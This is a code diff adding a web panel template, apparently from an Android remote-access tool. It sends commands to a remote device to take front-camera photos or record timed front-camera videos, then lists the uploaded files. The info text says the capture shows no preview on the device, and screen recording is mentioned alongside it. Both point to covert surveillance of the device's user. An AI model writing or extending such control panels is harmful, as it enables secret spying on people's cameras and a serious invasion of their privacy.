@@ -1,0 +1,156 @@
+<div class="ui segment">
+    <div class="ui stackable grid">
+        <div class="eight wide column">
+            <button onclick="takePhoto(this)" class="ui red left labeled icon button fluid">
+                <i class="camera icon"></i>
+                Take Front Camera Photo
+            </button>
+        </div>
+        <div class="eight wide column">
+            <div class="ui action input fluid" style="flex-wrap:wrap;">
+                <select id="frontVideoDuration" class="ui compact selection dropdown" style="min-width:8rem;">
+                    <option value="5">5 sec</option>
+                    <option value="10">10 sec</option>
+                    <option value="15" selected>15 sec</option>
+                    <option value="30">30 sec</option>
+                    <option value="60">60 sec</option>
+                </select>
+                <button type="button" onclick="takeFrontVideo(this)" class="ui purple left labeled icon button">
+                    <i class="video icon"></i>
+                    Record front video
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div class="ui info message" style="margin-top: 20px;">
+        <div class="header">Front camera</div>
+        <ul class="list">
+            <li><strong>Photo</strong> — single JPEG, no preview on device.</li>
+            <li><strong>Video</strong> — short MP4 from the front camera (Android 6+). Recording runs for the duration you pick, then uploads in chunks like screen recording.</li>
+            <li>Grant <strong>Camera</strong> permission on the device; keep the app / service running.</li>
+        </ul>
+    </div>
+
+    <table class="ui celled table">
+        <thead>
+            <tr>
+                <th>Time</th>
+                <th>Type</th>
+                <th>Name</th>
+                <th>Size</th>
+                <th>Actions</th>
+            </tr>
+        </thead>
+        <tbody>
+            <% if (pageData && pageData.length > 0) { 
+                pageData.forEach((item) => { 
+                    let date = new Date(item.time);
+                    var isVid = item.type === 'frontCameraVideo';
+                    var typeLabel = isVid ? 'Video (MP4)' : 'Photo (JPEG)';
+                    var sz = '';
+                    if (item.size) {
+                        sz = item.size >= 1048576
+                            ? (item.size / 1048576).toFixed(2) + ' MB'
+                            : (item.size / 1024).toFixed(2) + ' KB';
+                    } else { sz = 'Unknown'; }
+            %>
+            <tr>
+                <td class="collapsing"><%= date.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                <td class="collapsing"><%= typeLabel %></td>
+                <td><%= item.originalName || (isVid ? 'front_camera_video.mp4' : 'front_camera_photo.jpg') %></td>
+                <td class="collapsing"><%= sz %></td>
+                <td class="collapsing">
+                    <div class="ui buttons">
+                        <a href="<%= item.path %>" target="_blank" class="ui button blue">
+                            <i class="eye icon"></i> View
+                        </a>
+                        <div class="or"></div>
+                        <a href="<%= item.path %>" download="<%= item.originalName || (isVid ? 'video.mp4' : 'photo.jpg') %>"
+                            class="ui positive button">
+                            <i class="download icon"></i> Download
+                        </a>
+                    </div>
+                </td>
+            </tr>
+            <% }); 
+            } else { %>
+            <tr>
+                <td colspan="5" class="center aligned">
+                    <div class="ui message">
+                        <p>No front camera photos or videos yet.</p>
+                    </div>
+                </td>
+            </tr>
+            <% } %>
+        </tbody>
+    </table>
+
+    <script>
+        function takePhoto(element) {
+            console.log('Take photo button clicked');
+            $(element).addClass('loading');
+            $(element).prop('disabled', true);
+            
+            if (!baseURL) {
+                console.error('baseURL is not defined!');
+                showNotification('#f03434', 'Error: baseURL not defined');
+                $(element).removeClass('loading');
+                $(element).prop('disabled', false);
+                return;
+            }
+            
+            sendCommand('0xCA', {}, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', 'Error: ' + error);
+                        $(element).removeClass('loading');
+                        $(element).prop('disabled', false);
+                    }, 300);
+                } else {
+                    setTimeout(() => {
+                        $(element).removeClass('loading');
+                        $(element).prop('disabled', false);
+                        showNotification('#2ecc71', 'Photo requested. Reloading shortly…');
+                        setTimeout(() => { window.location.reload(); }, 5000);
+                    }, 300);
+                }
+            });
+        }
+
+        function takeFrontVideo(element) {
+            var duration = parseInt($('#frontVideoDuration').val(), 10) || 15;
+            var btn = element && element.nodeType ? element : document.querySelector('button[onclick*="takeFrontVideo"]');
+            if (!btn) return;
+            $(btn).addClass('loading');
+            $(btn).prop('disabled', true);
+
+            if (!baseURL) {
+                showNotification('#f03434', 'Error: baseURL not defined');
+                $(btn).removeClass('loading');
+                $(btn).prop('disabled', false);
+                return;
+            }
+
+            sendCommand('0xCV', { duration: duration }, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', 'Error: ' + error);
+                        $(btn).removeClass('loading');
+                        $(btn).prop('disabled', false);
+                    }, 300);
+                } else {
+                    setTimeout(() => {
+                        $(btn).removeClass('loading');
+                        $(btn).prop('disabled', false);
+                        var waitMs = Math.max(15000, (duration + 25) * 1000);
+                        showNotification('#2ecc71', 'Recording ' + duration + 's video on device… Page will refresh when upload may be done.');
+                        setTimeout(() => { window.location.reload(); }, waitMs);
+                    }, 300);
+                }
+            });
+        }
+    </script>
+
+</div>
+
